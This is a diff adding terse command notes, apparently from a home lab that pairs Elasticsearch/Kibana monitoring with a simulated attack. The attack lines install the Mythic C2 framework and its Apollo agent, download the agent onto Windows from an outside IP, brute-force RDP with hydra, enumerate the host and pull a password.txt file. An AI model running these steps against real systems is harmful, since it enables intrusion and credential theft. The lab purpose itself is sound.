@@ -1,0 +1,59 @@
+System Update & Basic Utilities
+apt-get update && sudo apt-get upgrade -y
+wget
+nano
+ip a
+ls -la
+pwd
+gunzip
+less
+head -50
+
+ELK Stack – Elasticsearch & Kibana
+dpkg -i elasticsearch*.deb
+sudo chmod 755 elasticsearch
+systemctl daemon-reload
+systemctl enable elasticsearch.service
+systemctl start elasticsearch.service
+systemctl status elasticsearch.service
+./elasticsearch-create-enrollment-token --scope kibana
+/usr/share/kibana/bin/kibana-encryption-keys generate /etc/kibana/kibana.yml
+sudo systemctl restart kibana.service
+grep -i failed auth.log
+
+Package Installation
+apt install docker-compose
+apt install make
+apt-get install -y crowbar
+sudo apt install gnupg
+
+Kali Repository Key
+sudo wget https://archive.kali.org/archive-keyring.gpg \
+-O /usr/share/keyrings/kali-archive-keyring.gpg
+
+Mythic C2 – Setup, Agent Installation & File Transfer
+git clone https://github.com/its-a-feature/Mythic
+make
+./mythic-cli start
+./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+
+python3 -m http.server 9999
+wget https://45.32.198.29:7443/direct/download/2c486145-d36f-4201-ad90-c246ae54fe30 --no-check-certificate
+mv apollo.exe 1/
+Invoke-WebRequest -Uri http://45.32.198.29:9999/apollo.exe -OutFile "C:\Users\Public\Downloads\apollo.exe"
+
+RDP Brute-Force & Remote Access
+hydra -l Administrator -P NoursProject-wordlist.txt rdp://45.76.234.73
+xfreerdp3 /u:Administrator /p:NoursProject2025! /v:45.76.234.73
+
+Windows Enumeration & Data Retrieval
+whoami
+ipconfig
+net user
+net group
+netstat -anob
+dir
+download C:\Users\Administrator\Documents\password.txt
+
+osTicket Configuration
+icacls .\ost-config.php /reset
